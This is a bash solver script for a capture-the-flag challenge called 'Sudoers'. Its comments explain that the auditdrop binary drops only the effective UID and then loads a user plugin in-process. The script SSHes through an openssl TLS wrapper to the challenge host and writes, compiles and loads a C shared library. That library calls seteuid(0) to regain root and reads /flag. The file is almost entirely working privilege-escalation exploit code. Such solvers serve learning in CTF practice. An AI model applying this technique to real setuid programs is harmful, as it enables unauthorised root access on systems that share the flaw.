#!/usr/bin/env bash
# Solver for "Sudoers" (auditdrop binary)
#
# Vulnerability: seteuid(getuid()) drops only the effective UID. The saved
# set-user-ID stays 0 (root), so the process can restore root at any later
# point -- and auditdrop loads the player's plugin *in-process* after the
# drop. A child process would NOT work: execve() copies the effective UID
# into the saved set-user-ID.
#
# The service sits behind Traefik's TLS entrypoint (the mapped tcp-ssl port),
# so SSH is wrapped in `openssl s_client`.
#
# Usage: solve.sh [host] [port]      (password: ctf)
set -euo pipefail

HOST="${1:-sudoers.challs.ingeniums.club}"
PORT="${2:-9450}"

ssh -o ProxyCommand='openssl s_client -quiet -servername %h -connect %h:%p' \
    -p "$PORT" ctf@"$HOST" 'bash -s' <<'REMOTE'
set -e
cat > /home/ctf/notes/pwn.c <<'EOF'
#include <stdio.h>
#include <unistd.h>

/* auditdrop dlopen()s this and calls it after dropping privileges. */
int audit_note(const char *path) {
    (void)path;
    if (seteuid(0) != 0) { perror("seteuid"); return 1; }
    FILE *f = fopen("/flag", "r");
    if (!f) { perror("fopen"); return 1; }
    char buf[256];
    while (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
    fclose(f);
    return 0;
}
EOF
gcc -shared -fPIC -o /home/ctf/notes/pwn.so /home/ctf/notes/pwn.c
/usr/local/bin/auditdrop pwn.so
REMOTE
